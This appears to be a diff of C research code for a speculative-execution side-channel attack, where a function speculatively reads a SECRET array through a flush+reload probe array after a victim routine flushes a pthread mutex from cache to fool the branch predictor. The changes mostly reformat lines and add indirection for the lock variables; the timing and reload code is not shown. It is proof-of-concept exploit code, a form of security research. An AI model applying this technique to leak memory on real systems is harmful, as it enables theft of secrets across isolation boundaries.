@@ -23,11 +23,13 @@
 
 cp_t* flush_reload_arr;
 
-void attack_func(pthread_mutex_t* lock_ptr, int* lock_val_ptr, int secret_index) {
+void attack_func(pthread_mutex_t* lock_ptr,
+                 int* lock_val_ptr, int secret_index) {
     if(pthread_mutex_trylock(lock_ptr) != 0) return;
     *lock_val_ptr = secret_index;
     pthread_mutex_unlock(lock_ptr);
-    volatile cp_t cp = flush_reload_arr[SECRET[*lock_val_ptr]];
+    volatile cp_t cp;
+    cp = flush_reload_arr[SECRET[*lock_val_ptr]];
 }
 
 /*
@@ -41,7 +43,6 @@ void attack_func(pthread_mutex_t* lock_ptr, int* lock_val_ptr, int secret_index)
  * Attack:   lock_index=0   secret_index={iterate through SECRET}
  */
 void victim_func(int lock_index, int secret_index) {
-
     //creates 2 locks. put addresses in array to prevent branches (fools branch predictor).
     pthread_mutex_t lock0, lock1;
     pthread_mutex_init(&lock0, FLAG);
@@ -51,17 +52,22 @@ void victim_func(int lock_index, int secret_index) {
     lock01_addresses[0] = &lock0;
     lock01_addresses[1] = &lock1;
     int lock0_var, lock1_var;
+    int* lock0or1var_addresses[n_locks];
+    lock0or1var_addresses[0] = &lock0_var;
+    lock0or1var_addresses[1] = &lock1_var;
 
-    //lock either lock0 or lock1, depending on the parameter. Branch predictor cannot determine which (no branches).
-    pthread_mutex_t* lock0or1_address = lock01_addresses[lock_index];
+    //lock either lock0 or lock1, depending on the parameter.
+    //Branch predictor cannot determine which (no branches).
+    //Set value of respective lock0_var or lock1_var to 0.
+    pthread_mutex_t* lock0or1_address;
+    lock0or1_address = lock01_addresses[lock_index];
     pthread_mutex_lock(lock0or1_address);
-    lock0_var = 0;
+    *lock0or1var_addresses[lock_index] = 0;
 
     //Remove lock0 from cache, so that the branch will speculatively execute.
     cpuid();
     flush(&lock0);
     cpuid();
-
     attack_func(&lock0, &lock0_var, secret_index);
 
     cpuid();
